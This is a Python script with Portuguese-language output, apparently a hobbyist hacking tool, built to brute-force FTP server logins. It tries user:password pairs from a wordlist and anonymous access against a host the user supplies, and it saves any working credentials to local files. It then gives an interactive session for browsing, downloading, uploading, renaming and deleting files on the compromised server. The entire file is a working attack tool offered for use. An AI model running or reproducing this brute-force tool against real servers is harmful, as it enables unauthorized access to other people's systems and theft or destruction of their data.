import os
import sys
import socket
import ftplib
import random
from time import sleep

MYSOCKET = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
checklog = ["logged","Login","login"]
attack_1 = False

def LimparTela():

	if sys.platform == "win32":
		os.system("cls")
	elif sys.platform == "linux":
		os.system("clear")


def Home():
	LimparTela()
	print("""\033[1;36m
            ((`\\           \033[m\033[1;31mScript para brute force em servidores FTP\033[m\033[1;36m
         ___ \\ '--._
      .'`   `'    o  )             \033[m\033[1m[\033[1;32m+\033[m\033[1m] Coded by:\033[m\033[1;34m Nano-9\033[m\033[1;36m
     /    \\   '. __.'              \033[m\033[1m[\033[1;32m+\033[m\033[1m] Telegram:\033[m\033[1;33m t.me/rdin9\033[m\033[1;36m
    _|    /_  \\ \\_\\_  
   {_\\______\\-'\\__\\_\\ 
\033[m\n""")



def Manual():
	banner()
	print("""
\033[1;31m>>> O SCRIPT AINDA ESTÁ EM FASES DE TESTES!!!! <<<\033[m

\033[1;36m[+] \033[m\033[1mEXEMPLO DE USO:\033[m

ftp.site.example.com ou 
apenas o IP + PORTA

\033[1;36m[+] \033[m\033[1mOBS:\033[m

\033[1;36m>\033[m Caso o script feche do nada sem avisar o motivo (no linux) 
\033[1;36m>\033[m é porque teve inúmeras requisições
\033[1;36m>\033[m e isso será arrumado na próxima atualização
\033[1;36m>\033[m Mesma coisa no Windows (aqui é avisado o motivo)
		""")
	raise SystemExit

def Comandos():

	print("""
\033[1mComando [\033[m \033[1;32mLS\033[m \033[1m] - Para listar o diretório\033[m
\033[1mComando [\033[m \033[1;32mCD\033[m \033[1m] - Para entrar dentro de um diretório\033[m
\033[1mComando [\033[m \033[1;32mCL\033[m \033[1m] - Para limpar a tela\033[m
\033[1mComando [\033[m \033[1;32mHP\033[m \033[1m] - Para visualizar os comandos do servidor\033[m
\033[1mComando [\033[m \033[1;32mPA\033[m \033[1m] - Para entrar no modo passivo (pode ser desconectado)\033[m
\033[1mComando [\033[m \033[1;32mCW\033[m \033[1m] - Para entrar direto no diretório\033[m
\033[1mComando [\033[m \033[1;32mDW\033[m \033[1m] - Para fazer o download de um arquivo\033[m
\033[1mComando [\033[m \033[1;32mUP\033[m \033[1m] - Para fazer o upload de um arquivo\033[m
\033[1mComando [\033[m \033[1;32mRN\033[m \033[1m] - Para renomear um arquivo no servidor\033[m
\033[1mComando [\033[m \033[1;32mEX\033[m \033[1m] - Para excluir arquivos do servidor\033[m
\033[1mComando [\033[m \033[1;32mMK\033[m \033[1m] - Para criar um diretório no servidor\033[m
\033[1mComando [\033[m \033[1;32mPW\033[m \033[1m] - Para retornar o caminho atual\033[m
\033[1mComando [\033[m \033[1;32mRM\033[m \033[1m] - Para remover um diretório\033[m
\033[1mComando [\033[m \033[1;32mQT\033[m \033[1m] - Para finalizar a conexão\033[m""")


while True:
	Home()
	if sys.platform == "linux":

		from signal import signal,SIGPIPE,SIG_DFL
		signal(SIGPIPE,SIG_DFL)
	try:
		host = str(input("\033[1;34mHOST:\033[m ")).strip()
	except KeyboardInterrupt:
		raise SystemExit
	except AttributeError:
		raise SystemExit
	else:
		if host.lower() == "m":
			Manual()
		if host == "":
			raise SystemExit
		try:
			port = str(input("\033[1;34mPORTA\033[m \033[1m(default 21): \033[m"))
		except KeyboardInterrupt:
			raise SystemExit
		except AttributeError:
			raise SystemExit

	logou = False
	userlogin = False
	userpassw = False
	usernames = False
	passwords = False
	senhas = {}
	print("\n\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Alvo:\033[m \033[1;32m>>>> {} <<<<\033[m\033[m".format(host))
	print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Carregando wordlist...\033[m")
	with open("wordlist.txt","r") as arqpass:
		for x in arqpass:
			pw1 = x.replace("\n","")
			pw2 = pw1.split(":")
			try:
				senhas[pw2[0]] = pw2[1]
			except IndexError:
				continue
		arqpass.close()
	print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Wordlist carregada!\033[m")
	print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Iniciando o brute force...\033[m\n")
	try:
		if not port:
			ftp = MYSOCKET.connect((host,21))
		else:
			ftp = MYSOCKET.connect((host,int(port)))
	except ftplib.socket.gaierror:
		print("\033[1m[\033[m\033[1;31mERROR\033[m\033[1m]\033[m\033[1m Insira um servidor!\033[m\n")
		raise SystemExit
	except ConnectionRefusedError:
		print("\033[1m[\033[m\033[1;31mERROR\033[m\033[1m]\033[m\033[1m Conexão recusada pelo servidor!\033[m\n")
		raise SystemExit
	except TimeoutError:
		print("\033[1m[\033[m\033[1;31mCLOSE\033[m\033[1m]\033[m\033[1m Conexão encerrada porque o tempo de resposta foi excedido!\033[m\n")
		raise SystemExit
	except KeyboardInterrupt:
		raise SystemExit
	except BrokenPipeError:
		print("\n\033[1m[\033[m\033[1;31mCLOSE\033[m\033[1m]\033[m\033[1m Muitas requisições em pouco tempo!\033[m\n")
		raise SystemExit
	except OSError:
		MYSOCKET = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		if not port:
			MYSOCKET.connect((host,21))
		else:
			MYSOCKET.connect((host,int(port)))
	#tentando logar:
	print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m ======================\033[m\033[1;34m TENTANDO FAZER LOGIN\033[m \033[1m======================\033[m \033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m\n\n")
	for k,v in senhas.items():
		MYSOCKET = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		try:
			MYSOCKET.connect((host,int(port)))
		except:
			MYSOCKET.connect((host,21))
		try:
			print("\033[1m[\033[m\033[1;36mLOGIN\033[m\033[1m]\033[m\033[1m Tentando com o user:\033[m \033[1;33m{}\033[m\033[1m e a senha:\033[m \033[1;33m{}\033[m".format(k,v))
			if k == "":
				MYSOCKET.send(b"USER anonymous \r\n")
				server_ignore1 = MYSOCKET.recv(1024)
			else:
				MYSOCKET.send(b"USER "+k.encode()+b" \r\n")
				server_ignore1 = MYSOCKET.recv(1024)
		except ftplib.error_perm:
			print("\033[1m[\033[m\033[1;31mERROR\033[m\033[1m]\033[m\033[1m Username e Password incorrect!\033[m")
		except ftplib.socket.gaierror:
			print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Insira um servidor!\n\033[m")
			raise SystemExit
		except EOFError:
			continue
		except ConnectionAbortedError:
			print("\n\033[1m[\033[m\033[1;31mCLOSE\033[m\033[1m]\033[m\033[1m Conexão abortada pelo host! Muitas tentativas\033[m\n")
			raise SystemExit
		except KeyboardInterrupt:
			raise SystemExit
		except BrokenPipeError:
			print("\n\033[1m[\033[m\033[1;31mCLOSE\033[m\033[1m]\033[m\033[1m Muitas requisições em pouco tempo!\033[m\n")
			raise SystemExit
		except AttributeError:
			continue
		else:
			if v == " ":
				MYSOCKET.send(b"PASS passwd \r\n")
				server_ignore2 = MYSOCKET.recv(1024)
				MYSOCKET.send(b"PASS passwd \r\n")
				server3 = MYSOCKET.recv(2048).decode().split(" ")
				prosseguir = True
				for confirmation in server3:
					if confirmation in checklog:
						try:
							entrar2 = ftplib.FTP(host=host)
							entrar3 = entrar2.login(user="anonymous",passwd="anonymous")
						except ftplib.error_perm:
							prosseguir = False
						if prosseguir:
							entrar2.quit()
							print("\n\033[1m[\033[m\033[1;32mACPT\033[m\033[1m]\033[m\033[m User aceito: anonymous\033[m")
							print("\033[1m[\033[m\033[1;32mACPT\033[m\033[1m]\033[m\033[m Senha aceita: anonymous\033[m")
							userlogin = "anonymous"
							userpassw = "anonymous"
							logou = True
							attack_1 = str(input("\n\033[1m[\033[m\033[1;33m*\033[m\033[1m]\033[m\033[m Deseja logar no servidor? Y/n ")).strip().lower()
							MYSOCKET.close()
						break
				MYSOCKET.close()
			else:
				MYSOCKET.send(b"PASS "+v.encode()+b" \r\n")
				server = MYSOCKET.recv(2048).decode().split(" ")
				for confirmating in server:
					if confirmating in checklog:
						try:
							entrar2 = ftplib.FTP(host=host)
							entrar3 = entrar2.login(user=k,passwd=v)
						except ftplib.error_perm:
							prosseguir = False
						
						if prosseguir:
							entrar2.quit()
							print("\n\033[1m[\033[m\033[1;32mACPT\033[m\033[1m]\033[m\033[m User aceito: {}\033[m".format(k))
							print("\033[1m[\033[m\033[1;32mACPT\033[m\033[1m]\033[m\033[m Senha aceita: {}\033[m".format(v))
							userlogin = k
							userpassw = v
							logou = True
							attack_1 = str(input("\n\033[1m[\033[m\033[1;33m*\033[m\033[1m]\033[m\033[m Deseja logar no servidor? Y/n ")).strip().lower()
							MYSOCKET.close()
						break
				print("\033[1m[\033[m\033[1;31mERROR\033[m\033[1m]\033[m\033[1m Username e Password incorrect!\033[m")
				MYSOCKET.close()
			if logou:
				os.makedirs("FTP_credenciais",exist_ok=True)
				if sys.platform == "win32":
					with open(r"FTP_credenciais\{}.txt".format(host),"a") as file1:
						file1.write("Servidor: {}\n".format(host))
						if port:
							file1.write("Porta: {}\n".format(port))
						else:
							file1.write("Porta: 21\n")
						file1.write("Username: {}\n".format(userlogin))
						file1.write("Password: {}\n\n".format(userpassw))
					file1.close()
				elif sys.platform == "linux":
					with open("FTP_credenciais/{}.txt".format(host),"a") as file1:
						file1.write("Servidor: {}\n".format(host))
						if port:
							file1.write("Porta: {}\n".format(port))
						else:
							file1.write("Porta: 21\n")
						file1.write("Username: {}\n".format(userlogin))
						file1.write("Password: {}\n\n".format(userpassw))
					file1.close()
				break
	if not logou:
		print("\n\033[1m[\033[m\033[1;31m None \033[m\033[1m]\033[m\033[1m Nenhum usuário encontrado! Voltando ao home...\033[m")
		MYSOCKET.close()
		sleep(2)
	if attack_1 == "y":
		MYSOCKET.close()
		Home()
		if logou:
			entrar = ftplib.FTP(host=host)
			entrar1 = entrar.login(user=userlogin,passwd=userpassw)
			print("\033[1m[\033[m\033[1;32m OK! \033[m\033[1m]\033[m\033[1m Você conseguiu acesso ao servidor:\033[m \033[1;36m{}\033[m".format(host))
			print("\033[1m[\033[m\033[1;32m OK! \033[m\033[1m]\033[m\033[1m Digite C para ter acesso a shell!\033[m\n")
			while entrar:
				comando_user = str(input("\n\033[1;31mftp@ftpbrute~>\033[m ")).strip().lower()
				print()
				try:
					if comando_user == "c":
						Comandos()
					elif comando_user == "cd":
						directory = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do diretório:\033[m ")).strip()
						try:
							entrar.cwd(directory)
						except ftplib.error_perm:
							try:
								entrar.cwd(directory.lower())
							except ftplib.error_perm:
								try:
									entrar.cwd(directory.capitalize())
								except:
									print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Permissão negada!\033[m")
					elif comando_user == "hp":
						print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Todos esses comandos foram para o meu painel de help,\033[m \033[1;32mDIGITE C\033[m \033[1mpara ver!\033[m\n\n")
						usernames = userlogin.encode()
						passwords = userpassw.encode()
						try:
							MYSOCKET.connect((host,port))
						except:
							MYSOCKET.connect((host,21))
						baner_pass = MYSOCKET.recv(1024)
						if userlogin == "" or userpassw == "":
							MYSOCKET.send(b"USER anonymous\r\n")
							userrecv = MYSOCKET.recv(1048)
							MYSOCKET.send(b"PASS passwd\r\n")
							paswrecv = MYSOCKET.recv(1048) 
							MYSOCKET.send(b"HELP \r\n")
							ignore = MYSOCKET.recv(2048)
							MYSOCKET.send(b"HELP \r\n")
							accept = MYSOCKET.recv(2048).decode("utf-8").replace("214 Help OK.","")
							print(accept)
						else:
							MYSOCKET.send(b"USER "+usernames+b"\r\n")
							userrecv = MYSOCKET.recv(1048)
							MYSOCKET.send(b"PASS "+passwords+b"\r\n")
							paswrecv = MYSOCKET.recv(1048) 
							MYSOCKET.send(b"HELP \r\n")
							ignore = MYSOCKET.recv(2048)
							MYSOCKET.send(b"HELP \r\n")
							accept = MYSOCKET.recv(2048).decode("utf-8").replace("214 Help OK.","")
							print(accept)
					elif comando_user == "ls":
						entrar.dir()
					elif comando_user == "pa":
						try:
							MYSOCKET.connect((host,port))
						except:
							MYSOCKET.connect((host,21))
						baner_pass = MYSOCKET.recv(1024)
						if userlogin == "" or userpassw == "":
							MYSOCKET.send(b"USER anonymous\r\n")
							userrecv = MYSOCKET.recv(1048)
							MYSOCKET.send(b"PASS passwd\r\n")
							paswrecv = MYSOCKET.recv(1048) 
							MYSOCKET.send(b"PASV \r\n")
							accept = MYSOCKET.recv(2048).decode("utf-8").replace("214 Help OK.","")
							print(accept)
						else:
							MYSOCKET.send(b"USER "+usernames+b"\r\n")
							userrecv = MYSOCKET.recv(1048)
							MYSOCKET.send(b"PASS "+passwords+b"\r\n")
							paswrecv = MYSOCKET.recv(1048) 
							MYSOCKET.send(b"PASV \r\n")
							accept = MYSOCKET.recv(2048).decode("utf-8").replace("214 Help OK.","")
							print(accept)
					elif comando_user == "cl":
						if sys.platform == "win32":
							os.system("cls")
							banner()
						elif sys.platform == "linux":
							os.system("clear")
					elif comando_user == "qt":
						print("\033[1m[\033[m\033[1;32m+\033[m\033[1m]\033[m\033[1m Fechando conexão...\033[m")
						try:
							entrar.quit()
						except TimeoutError:
							raise SystemExit
						else:
							raise SystemExit
					elif comando_user == "dw":
						arquivo_download = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m \033[1mNome do arquivo a ser baixado:\033[m ")).strip()
						print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Tentando realizar o download...\033[m")
						try: 
							with open(arquivo_download,"wb") as arqs:
								entrar.retrbinary(f"RETR {arquivo_download}",arqs.write)
								arqs.close()
						except ftplib.all_errors:
							print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m O arquivo pode ser um diretório ou sua permissão foi negada!\033[m")
						else:
							print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo baixado!\033[m")
					elif comando_user == "rn":
						nome_arquivo_orign = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do arquivo: \033[m")).strip()
						nome_novo_arquivos = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Novo nome: \033[m")).strip()
						try:
							entrar.rename(fromname=nome_arquivo_orign,toname=nome_novo_arquivos)
						except ftplib.error_perm:
							print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Alteração negada! Seu usuário não tem permissão...\033[m")
						else:
							print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo alterado!\033[m")
					elif comando_user == "pw":
						print(entrar.pwd())
					elif comando_user == "cw":
						directory_enter = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do diretório: \033[m")).strip()
						entrar.cwd(directory_enter)
					elif comando_user == "ex":
						dirname = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do diretório/arquivo a ser removido: \033[m")).strip()
						try:
							entrar.rmd(dirname)
						except ftplib.error_perm:
							print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Remoção negada! Seu usuário não tem permissão...\033[m")
						else:
							print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo\033[m \033[1;33m{}\033[m removido!\033[m".format(dirname))
					elif comando_user == "mk":
						dirname_create = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do diretório a ser criado: \033[m")).strip()
						try:
							entrar.mkd(dirname_create)
						except ftplib.error_perm:
							print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Criação negada! Seu usuário não tem permissão...\033[m")
						else:
							print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo criado!\033[m")
					elif comando_user == "rm":
						dirname_2 = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do arquivo: \033[m")).strip()
						try:
							entrar.delete(dirname_2)
						except ftplib.error_perm:
							print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Remoção negada! Seu usuário não tem permissão...\033[m")
						else:
							print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo\033[m \033[1;33m{}\033[m removido!\033[m".format(dirname))
					elif comando_user == "up":
						nome_arquivo_upload = str(input("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Nome do arquivo: \033[m")).strip()
						try:
							with open(nome_arquivo_upload,"rb") as uploads:
								entrar.storbinary(f"STOR {nome_arquivo_upload}",uploads)
							uploads.close()
						except FileNotFoundError:
							print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Arquivo não encontrado!\033[m")
						except PermissionError:
							pass
						except ftplib.error_perm:
							print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Upload negado! Seu usuário não tem permissão...\033[m")
						else:
							print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Arquivo enviado!\033[m")
					elif comando_user == "ld":
						print(entrar.mlsd())
				except TimeoutError:
					print("\033[1m[\033[m\033[1;31mCLOSE\033[m\033[1m]\033[m\033[1m Conexão encerrada porque o tempo de resposta foi excedido!\033[m\n")
					entrar.quit()
					raise SystemExit
				except KeyboardInterrupt:
					raise SystemExit
				except OSError:
					print("\033[1m[\033[m\033[1;31mCLOSE\033[m\033[1m]\033[m\033[1m Você foi desconectado do servidor, relogue!\033[m\n")
					raise SystemExit
			else:
				print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Nenhuma senha encontrada para esse servidor...\n")
	else:
		pass
